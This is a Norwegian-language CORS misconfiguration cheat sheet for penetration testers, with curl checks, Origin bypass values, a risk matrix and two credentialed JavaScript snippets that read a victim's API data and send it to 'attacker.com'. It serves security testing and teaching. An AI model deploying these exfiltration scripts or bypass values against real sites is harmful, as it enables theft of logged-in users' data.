# 🌍 Hurtigreferanse for feilkonfigurert CORS

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗ ██████╗ ██████╗ ███████╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝
  ██║     ██║   ██║██████╔╝███████╗
  ██║     ██║   ██║██╔══██╗╚════██║
  ╚██████╗╚██████╔╝██║  ██║███████║
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
   Ressursdeling mellom origins
```

> **Begreper og presisering:** Et origin består av skjema, vert og port. CORS styrer nettleserens lesetilgang til svar og er ikke en autentiseringsmekanisme. Et reflektert Origin eller credentials-header er ikke alene et kritisk funn: angriperen må kunne lese relevante data i et faktisk nettleserscenario. Wildcard * kan ikke brukes til slik lesing med credentials; se [MDNs forklaring](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSNotSupportingCredentials). Matrisens risikonivåer er derfor illustrative. Cookie-policy, preflight og SameSite kan påvirke eksemplene, mens curl ikke håndhever nettleserens CORS-regler. btoa forutsetter egnet byteinnhold og er ikke universell tekstkoding. Originalkode og headere er beholdt.

---

## 🎯 Hva er CORS

**CORS** styrer hvilke origins som får lese ressurser på tvers av origins. Feilkonfigurasjoner kan gjøre det mulig å stjele sensitive data fra et annet origin.

---

## 🔍 Testing av CORS

### Grunnleggende test
```bash
curl -H "Origin: https://evil.com" -I https://target.com/api/user

# Undersøk responsheaderne:
Access-Control-Allow-Origin: https://evil.com  # Sårbar! (se presiseringen)
Access-Control-Allow-Credentials: true         # Ekstra risikabelt! (se presiseringen)
```

### Testverdier for Origin-headeren
```
# Omgåelse av eksakt samsvar
https://evil.com
https://target.com.evil.com
https://eviltarget.com
https://target.com%60.evil.com

# null-origin
null

# Underdomene
https://sub.target.com

# Nedgradering av protokoll
http://target.com
```

---

## 💉 Utnyttelse

### Stjel data (med påloggingsinformasjon)
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable.com/api/user', true);
xhr.withCredentials = true;
xhr.onload = function() {
    // Send data til angriperen
    fetch('https://attacker.com/log?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
```

### Variant med Fetch API
```html
<script>
fetch('https://vulnerable.com/api/sensitive', {
    credentials: 'include'
})
.then(r => r.text())
.then(d => {
    fetch('https://attacker.com/?data=' + btoa(d));
});
</script>
```

---

## 📊 Sårbarhetsmatrise

| ACAO-header | ACAC | Risiko |
|-------------|------|------|
| `*` | false | Lav (uten påloggingsinformasjon) |
| `*` | true | Ugyldig konfigurasjon |
| Angriperens origin | true | **KRITISK** |
| null | true | **HØY** |
| Reflektert origin | true | **KRITISK** |

### Farlige mønstre
```http
# Reflekterer ethvert origin
Access-Control-Allow-Origin: [request origin]
Access-Control-Allow-Credentials: true

# Tillater null
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

---

## 🛠️ Raske kontroller

```bash
# Automatisering med curl
for origin in "https://evil.com" "null" "https://target.com.evil.com"; do
  echo "Testing: $origin"
  curl -sI -H "Origin: $origin" https://target.com/api | grep -i "access-control"
done
```

---

## 📚 Ressurser

- [PortSwigger CORS](https://portswigger.net/web-security/cors)
- [CORS Exploitation Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)

---

<p align="center">
  <b>🌍 Undersøk CORS-konfigurasjonen!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
